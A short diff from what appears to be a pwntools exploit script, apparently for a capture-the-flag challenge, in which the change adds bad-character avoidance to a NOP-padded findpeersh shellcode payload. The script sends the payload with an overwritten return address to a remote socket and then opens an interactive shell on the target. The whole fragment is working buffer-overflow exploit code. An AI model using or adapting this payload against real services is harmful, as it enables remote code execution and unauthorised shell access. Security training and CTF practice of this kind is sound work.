@@ -13,5 +13,5 @@ sock.recvuntil('Your output to my input? Do your best!\n')
 shellcode = asm(findpeersh(sock.lport))
 
 eip = 0x0804a080
-sock.send(flat(nop_pad(0xD4, findpeersh(sock.lport)), eip, '\n'))
+sock.send(flat(nop_pad(0xD4, findpeersh(sock.lport), avoid='\x00\r\n'), eip, '\n'))
 sock.interactive()
